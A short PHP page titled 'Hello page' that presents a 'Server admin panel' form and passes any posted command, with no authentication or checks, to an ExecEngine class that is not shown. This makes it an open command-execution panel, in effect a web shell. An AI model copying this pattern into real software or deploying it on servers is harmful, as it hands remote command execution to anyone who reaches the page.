<html lang="en">
<head>
    <title>Hello page</title>
    <link rel="stylesheet" href="style.css" type="text/css"/>
</head>
<body>
    <h1>Server admin panel</h1>
    <form method="post">
        Enter Command: <input type="text" name="command"> <input type="submit" name="submit" value="Execute">  
    </form>
    <?php
    include_once 'exec_engine.php';
    if(isset($_POST["command"])){
        new ExecEngine($_POST["command"]);
    }
    ?>
</body>
</html>